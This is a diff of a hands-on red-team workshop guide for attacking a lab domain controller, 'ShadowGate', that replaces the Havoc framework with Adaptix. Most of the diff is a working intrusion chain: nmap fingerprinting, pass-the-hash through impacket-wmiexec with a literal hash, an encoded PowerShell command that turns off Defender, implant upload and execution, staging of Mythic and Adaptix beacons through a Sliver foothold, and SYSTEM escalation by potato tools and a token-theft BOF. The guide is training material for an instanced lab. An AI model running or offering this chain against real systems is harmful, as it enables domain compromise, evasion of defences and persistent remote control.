@@ -9,7 +9,7 @@ The hands-on attack chain: from a deployed lab and validated C2 to a Sliver beac
 | Depends on    | DEPLOY (tunnel up, target reachable) + CONFIG (Sliver listener live)     |
 | Format        | Hands-on, every attendee against their own instanced ShadowGate         |
 | Target        | `DC01.shadow.gate` at `<ShadowGate IP>` (Windows Server 2022 DC)             |
-| C2            | Sliver drives; Mythic and Havoc beacons staged on the target through it |
+| C2            | Sliver drives; Mythic and Adaptix beacons staged on the target through it |
 | Two paths     | Operator to target over the tunnel; target to redirector over the public EIP |
 | End state     | SYSTEM on ShadowGate via Sliver, all three C2s landed, then teardown    |
 
@@ -59,10 +59,10 @@ Confirm `10.1.0.0/16` routes via the Guacamole ENI:
 ip route
 ```
 
-Fingerprint DC01 (SMB, Kerberos, LDAP, AD CS web enrollment):
+Fingerprint DC01 over the tunnel and pull its hostname off SMB and RDP:
 
 ```bash
-nmap -Pn -sC -sV <ShadowGate IP>
+nmap -Pn -sV -T4 --version-light --script smb-os-discovery,rdp-ntlm-info <ShadowGate IP>
 ```
 
 Add the host entry so domain tooling resolves names:
@@ -71,7 +71,7 @@ Add the host entry so domain tooling resolves names:
 echo '<ShadowGate IP>  DC01.shadow.gate shadow.gate DC01' | sudo tee -a /etc/hosts
 ```
 
-Success: nmap returns the domain controller's services (53, 88, 389, 445, 636, 5985 and the AD CS HTTP endpoint). The tunnel is carrying operator traffic.
+Success: nmap returns DC01's services (SMB 445, Kerberos 88, LDAP 389/636, WinRM 5985, RDP 3389, and the AD CS web endpoint among them), and `smb-os-discovery` plus `rdp-ntlm-info` report the computer name, domain, and OS build (`DC01` / `shadow.gate`, Server 2022 `10.0.20348`). That confirms the tunnel is carrying operator traffic and gives you the name for the hosts entry you add next.
 
 If it fails: nmap timing out means the tunnel is down. Recheck DEPLOY Step 10 (reachability to the target) and that `<ShadowGate IP>` falls inside your `vpn_tunnel_cidrs`.
 
@@ -101,7 +101,7 @@ scp admin@sliver:/tmp/sysProxy.exe .
 2. Disable Defender on the DC (pass-the-hash, `-nooutput` because AV deletes the wmiexec output file). The encoded command is `Set-MpPreference -DisableRealtimeMonitoring 1`:
 
 ```bash
-impacket-wmiexec -hashes :4366ec0f86e29be2a4a5e87a1ba922ec -nooutput shadow.gate/Administrator@<ShadowGate IP> 'powershell -enc UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgADEA'
+impacket-wmiexec -hashes :4366ec0f86e29be2a4a5e87a1ba922ec -nooutput shadow.gate/Administrator@dc01 'powershell -enc UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgADEA'
 ```
 
 Success: Defender is disabled so now we can smuggle in our implant. 
@@ -142,7 +142,7 @@ Success:
 4. Execute it:
 
 ```bash
-impacket-wmiexec -hashes :4366ec0f86e29be2a4a5e87a1ba922ec -nooutput shadow.gate/Administrator@<ShadowGate IP> 'C:\Windows\Temp\sysProxy.exe'
+impacket-wmiexec -hashes :4366ec0f86e29be2a4a5e87a1ba922ec -nooutput shadow.gate/Administrator@dc01 'C:\Windows\Temp\sysProxy.exe'
 ```
 
 Success: Implant has been executed on the host
@@ -178,20 +178,20 @@ If it fails: watch the redirector for the callback (`sudo tail -f /var/log/apach
 
 ---
 
-## Phase 4: Stage Mythic and Havoc through the Sliver beacon
+## Phase 4: Stage Mythic and Adaptix through the Sliver beacon
 
 With a foothold on the DC, stage the other two C2s through it instead of going back to SMB. The Sliver beacon carries them in, and because they run as children of the Administrator beacon they call back as Administrator too. All three frameworks end up with a beacon on the target.
 
-The Apollo and Havoc implants are the CONFIG builds (Phase B and C), pointed at the redirector public EIP on 443, so their callbacks work on the DC unchanged. Push them from the Windows operator (where CONFIG left them) to the Sliver host. Windows Server 2022 ships the OpenSSH client:
+The Apollo and Adaptix beacons are the CONFIG builds (Phase B and C), pointed at the redirector public EIP on 443, so their callbacks work on the DC unchanged. Push them from the Windows operator (where CONFIG left them) to the Sliver host. Windows Server 2022 ships the OpenSSH client:
 
-These are the CONFIG builds (`msDiag.exe` from Phase B, `hlpUpdate.exe` from Phase C). Use MobaXTerm to upload them to the Slivers /tmp directory or SCP each one at a time:
+These are the CONFIG builds (`msDiag.exe` from Phase B, `axUpdate.exe` from Phase C). Use MobaXTerm to upload them to the Slivers /tmp directory or SCP each one at a time:
 
 ```powershell
 scp C:\Users\Administrator\Desktop\msDiag.exe admin@sliver:/tmp/
 ```
 
 ```powershell
-scp C:\Users\Administrator\Desktop\hlpUpdate.exe admin@sliver:/tmp/
+scp C:\Users\Administrator\Desktop\axUpdate.exe admin@sliver:/tmp/
 ```
 
 In sliver-client, select the Administrator session, then upload both to the DC and execute. Run these one at a time, not as a block: Sliver errors on pasted multi-command input. Use forward slashes on the upload target, and no `-o` on execute (with `-o` it blocks on a beacon that never returns):
@@ -205,7 +205,7 @@ upload /tmp/msDiag.exe C:/Windows/Temp/msDiag.exe
 ```
 
 ```text
-upload /tmp/hlpUpdate.exe C:/Windows/Temp/hlpUpdate.exe
+upload /tmp/axUpdate.exe C:/Windows/Temp/axUpdate.exe
 ```
 
 ```text
@@ -213,10 +213,10 @@ execute C:\\Windows\\Temp\\msDiag.exe
 ```
 
 ```text
-execute C:\\Windows\\Temp\\hlpUpdate.exe
+execute C:\\Windows\\Temp\\axUpdate.exe
 ```
 
-Success: Apollo registers in Mythic's Active Callbacks and the demon in Havoc's Sessions tab, both as `SHADOW\Administrator`. All three C2s now hold an Administrator beacon on the DC, staged entirely through the Sliver foothold, no SMB or pass-the-hash needed after the first beacon.
+Success: Apollo registers in Mythic's Active Callbacks and the beacon in Adaptix's sessions view, both as `SHADOW\Administrator`. All three C2s now hold an Administrator beacon on the DC, staged entirely through the Sliver foothold, no SMB or pass-the-hash needed after the first beacon.
 
 If it fails: if a beacon does not appear, Defender may have caught the less-obfuscated payload; re-run the Defender disable from Phase 3 and re-execute. Confirm the files uploaded with `ls C:/Windows/Temp/`.
 
@@ -261,12 +261,12 @@ If it fails: if the new session never appears, re-confirm the task path echoed w
 
 SYSTEM on `DC01` via Sliver is done: Phase 5 took the Administrator beacon to SYSTEM with a scheduled task. Now do the same in the other two frameworks.
 
-Your turn. The Mythic and Havoc beacons from Phase 4 are sitting at Administrator on the same DC, and every one of them holds `SeImpersonatePrivilege`, so the token-abuse ("potato") family is open to you. Land a SYSTEM callback in Mythic and Havoc as well. Some routes to try:
+Your turn. The Mythic and Adaptix beacons from Phase 4 are sitting at Administrator on the same DC, and every one of them holds `SeImpersonatePrivilege`, so the token-abuse ("potato") family is open to you. Land a SYSTEM callback in Mythic and Adaptix as well. Some routes to try:
 
 - Mythic (Apollo): GodPotato, run through Apollo's `execute_assembly` (or SigmaPotato, https://github.com/tylerdotrar/SigmaPotato, a GodPotato successor built for reflective in-memory loading). It abuses `SeImpersonatePrivilege` over DCOM, so it needs no Print Spooler and works cleanly on a domain controller.
-- Havoc: Havoc's built-in `token steal` does not work on this box, because on a hardened Server 2022 DC the only SYSTEM tokens live in protected lsass and cannot be duplicated. Two things do work: 
-	- A token-impersonation BOF is the clean in-session option: Mr.Un1k0d3r's Elevate-System-Trusted BOF (`github.com/Mr-Un1k0d3r/Elevate-System-Trusted-BOF`), run with `inline-execute`, impersonates winlogon's SYSTEM token via `SetThreadToken` and flips the demon to SYSTEM (and TrustedInstaller) with no new callback. 
-	- Or stay in the potato family: a DCOM-based potato (SigmaPotato or GodPotato) coerces a fresh SYSTEM token. Avoid PrintSpoofer here, the Print Spooler is usually off on a DC.
+- Adaptix: the Adaptix beacon executes BOFs and .NET assemblies, so the same two routes apply, run through Adaptix's command set (see the client's command help for exact syntax). Two things work: 
+	- A token-impersonation BOF is the clean in-session option: Mr.Un1k0d3r's Elevate-System-Trusted BOF (`https://github.com/Mr-Un1k0d3r/Elevate-System-Trusted-BOF`), loaded through Adaptix's BOF execution, impersonates winlogon's SYSTEM token via `SetThreadToken` and flips the beacon to SYSTEM (and TrustedInstaller) with no new callback. 
+	- Or stay in the potato family: a DCOM-based potato (SigmaPotato or GodPotato) run as a .NET assembly coerces a fresh SYSTEM token. Avoid PrintSpoofer here, the Print Spooler is usually off on a DC.
 
 The point is that once you hold `SeImpersonatePrivilege`, SYSTEM is a token away, and each C2 exposes a slightly different way to spend it.
 
@@ -297,4 +297,4 @@ Also disconnect the HSL side and confirm your CloudWatch billing alarm cleared.
 
 ## Where this ends
 
-ShadowGate under SYSTEM via a Sliver beacon that traversed the redirector, with Mythic and Havoc beacons staged through that same foothold and their SYSTEM step left to the attendee, then a clean teardown. That is the full boot-to-breach arc: DEPLOY stood up the platform, CONFIG proved all three callback paths, ATTACK used all three against a live target.
+ShadowGate under SYSTEM via a Sliver beacon that traversed the redirector, with Mythic and Adaptix beacons staged through that same foothold and their SYSTEM step left to the attendee, then a clean teardown. That is the full boot-to-breach arc: DEPLOY stood up the platform, CONFIG proved all three callback paths, ATTACK used all three against a live target.
